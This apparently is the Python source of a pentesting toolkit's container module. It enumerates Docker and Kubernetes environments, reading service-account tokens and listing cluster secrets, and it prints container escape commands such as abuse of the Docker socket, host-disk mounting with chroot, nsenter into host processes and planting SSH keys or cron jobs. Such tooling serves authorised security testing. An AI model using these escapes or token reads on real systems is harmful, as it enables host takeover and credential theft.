#!/usr/bin/env python3
"""HackAssist - Container Escape & Docker/K8s Pentesting."""

from ui import console, show_menu, ask, info, success, warning, error
from executor import run_with_preview, run_command


CONTAINER_CHECKS = [
    {'name': 'Check if in container', 'cmd': 'cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null; cat /proc/self/mountinfo 2>/dev/null | head -20'},
    {'name': 'Container environment', 'cmd': 'env | grep -iE "(docker|kube|container|pod)" 2>/dev/null; hostname'},
    {'name': 'Capabilities', 'cmd': 'capsh --print 2>/dev/null || cat /proc/self/status | grep -i cap'},
    {'name': 'Mounted volumes', 'cmd': 'mount | grep -vE "(proc|sys|cgroup)" ; df -h'},
    {'name': 'Docker socket', 'cmd': 'ls -la /var/run/docker.sock 2>/dev/null; ls -la /run/docker.sock 2>/dev/null'},
    {'name': 'Kubernetes tokens', 'cmd': 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; ls -la /var/run/secrets/ 2>/dev/null'},
    {'name': 'Network namespace', 'cmd': 'ip addr 2>/dev/null; cat /etc/resolv.conf; cat /etc/hosts'},
    {'name': 'Privileged mode check', 'cmd': 'ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED MODE" && ip link delete dummy0 || echo "Not privileged"'},
    {'name': 'Available tools', 'cmd': 'which curl wget nc ncat socat python python3 perl ruby 2>/dev/null'},
    {'name': 'Process list', 'cmd': 'ps aux 2>/dev/null || ps -ef'},
]

ESCAPE_TECHNIQUES = [
    {
        'name': 'Docker Socket Mount',
        'desc': 'If /var/run/docker.sock is mounted, create a privileged container',
        'check': 'ls -la /var/run/docker.sock',
        'exploit': 'docker run -v /:/host --privileged -it alpine chroot /host',
        'severity': 'CRITICAL',
    },
    {
        'name': 'Privileged Container',
        'desc': 'Mount host filesystem via privileged capabilities',
        'check': 'fdisk -l 2>/dev/null',
        'exploit': 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host',
        'severity': 'CRITICAL',
    },
    {
        'name': 'CAP_SYS_ADMIN Abuse',
        'desc': 'Use cgroup release_agent for code execution on host',
        'check': 'cat /proc/self/status | grep CapEff',
        'exploit': 'See: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/',
        'severity': 'CRITICAL',
    },
    {
        'name': 'Host PID Namespace',
        'desc': 'If sharing host PID namespace, can interact with host processes',
        'check': 'ps aux | head -5',
        'exploit': 'nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash',
        'severity': 'HIGH',
    },
    {
        'name': 'Host Network Namespace',
        'desc': 'Access host network services including localhost-bound ones',
        'check': 'ip addr; ss -tlnp',
        'exploit': 'curl http://127.0.0.1:<host-only-port>',
        'severity': 'MEDIUM',
    },
    {
        'name': 'Writable hostPath',
        'desc': 'K8s pod with writable hostPath volume',
        'check': 'mount | grep -E "type (ext4|xfs|btrfs)"',
        'exploit': 'Write SSH key or cron to mounted host path',
        'severity': 'CRITICAL',
    },
    {
        'name': 'Kernel Exploit',
        'desc': 'Exploit kernel vulnerabilities (DirtyPipe, DirtyCow, etc)',
        'check': 'uname -r',
        'exploit': 'Compile and run kernel exploit matching host kernel version',
        'severity': 'HIGH',
    },
]

K8S_ENUM = {
    'List Pods': 'kubectl get pods --all-namespaces',
    'List Services': 'kubectl get services --all-namespaces',
    'List Secrets': 'kubectl get secrets --all-namespaces',
    'Cluster Info': 'kubectl cluster-info',
    'Service Accounts': 'kubectl get serviceaccounts --all-namespaces',
    'RBAC Roles': 'kubectl get clusterroles',
    'Pod Security Policies': 'kubectl get psp',
    'Network Policies': 'kubectl get networkpolicies --all-namespaces',
    'Can-I Check': 'kubectl auth can-i --list',
    'Nodes': 'kubectl get nodes -o wide',
}


def _container_detection(session):
    console.print("\n[bold cyan]Container Detection & Enumeration[/bold cyan]\n")
    options = [(str(i), c['name']) for i, c in enumerate(CONTAINER_CHECKS, 1)]
    options.append(("a", "Run ALL checks"))
    options.append(("0", "Back"))
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "a":
        for check in CONTAINER_CHECKS:
            console.print(f"\n[bold cyan]--- {check['name']} ---[/bold cyan]")
            run_with_preview(check['cmd'], session=session, stage="container")
    else:
        try:
            idx = int(choice) - 1
            check = CONTAINER_CHECKS[idx]
            run_with_preview(check['cmd'], session=session, stage="container")
        except (ValueError, IndexError):
            pass


def _escape_techniques(session):
    from rich.table import Table
    table = Table(title="Container Escape Techniques", border_style="red")
    table.add_column("#", width=4)
    table.add_column("Technique", style="cyan")
    table.add_column("Severity", style="bold")
    table.add_column("Description", style="white")

    for i, t in enumerate(ESCAPE_TECHNIQUES, 1):
        sev_color = {'CRITICAL': 'bold red', 'HIGH': 'red', 'MEDIUM': 'yellow'}[t['severity']]
        table.add_row(str(i), t['name'], f"[{sev_color}]{t['severity']}[/{sev_color}]", t['desc'])
    console.print(table)

    choice = ask("Select technique # to try (or Enter to skip)")
    if not choice:
        return
    try:
        idx = int(choice) - 1
        tech = ESCAPE_TECHNIQUES[idx]
        console.print(f"\n[bold]Check:[/bold] {tech['check']}")
        console.print(f"[bold]Exploit:[/bold] {tech['exploit']}")
        if ask("Run check command? (y/n)") == 'y':
            run_with_preview(tech['check'], session=session, stage="container")
    except (ValueError, IndexError):
        pass


def _k8s_enum(session):
    console.print("\n[bold blue]Kubernetes Enumeration[/bold blue]\n")
    options = [(str(i), name) for i, name in enumerate(K8S_ENUM.keys(), 1)]
    options.append(("0", "Back"))
    choice = show_menu(options)
    if choice == "0":
        return
    try:
        idx = int(choice) - 1
        name = list(K8S_ENUM.keys())[idx]
        run_with_preview(K8S_ENUM[name], session=session, stage="container")
    except (ValueError, IndexError):
        pass


def _docker_enum(session):
    cmds = {
        'List containers': 'docker ps -a',
        'List images': 'docker images',
        'List networks': 'docker network ls',
        'List volumes': 'docker volume ls',
        'Docker info': 'docker info',
        'Docker version': 'docker version',
        'Inspect container': 'docker inspect {container}',
    }
    console.print("\n[bold cyan]Docker Enumeration[/bold cyan]\n")
    options = [(str(i), name) for i, name in enumerate(cmds.keys(), 1)]
    options.append(("0", "Back"))
    choice = show_menu(options)
    if choice == "0":
        return
    try:
        idx = int(choice) - 1
        name = list(cmds.keys())[idx]
        cmd = cmds[name]
        if '{container}' in cmd:
            container = ask("Container ID/name")
            cmd = cmd.format(container=container)
        run_with_preview(cmd, session=session, stage="container")
    except (ValueError, IndexError):
        pass


def run(session):
    """Container escape module entry point."""
    while True:
        console.print("\n[bold green]CONTAINER ESCAPE & SECURITY[/bold green]\n")
        options = [
            ("1", "Container Detection & Enumeration"),
            ("2", "Escape Techniques"),
            ("3", "Kubernetes Enumeration"),
            ("4", "Docker Enumeration"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            break
        elif choice == "1":
            _container_detection(session)
        elif choice == "2":
            _escape_techniques(session)
        elif choice == "3":
            _k8s_enum(session)
        elif choice == "4":
            _docker_enum(session)
